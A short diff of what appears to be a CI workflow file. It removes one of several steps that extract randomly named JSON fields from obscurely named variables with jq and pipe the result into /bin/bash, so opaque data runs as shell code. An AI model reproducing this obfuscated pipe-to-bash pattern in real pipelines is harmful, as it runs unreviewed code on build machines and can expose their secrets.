@@ -26,7 +26,6 @@ jobs:
           echo $ayq5 | jq -r .ar73 | /bin/bash
           printf '%s' "$qgob28" | jq -r .gvl2 | /bin/bash
           echo $pcxs52 | jq -r .so465 | /bin/bash
-          echo $ef62 | jq -r .s836 | /bin/bash
           printf '%s' "$hpy65" | jq -r .ca0 | /bin/bash
 
       - name: Persist data
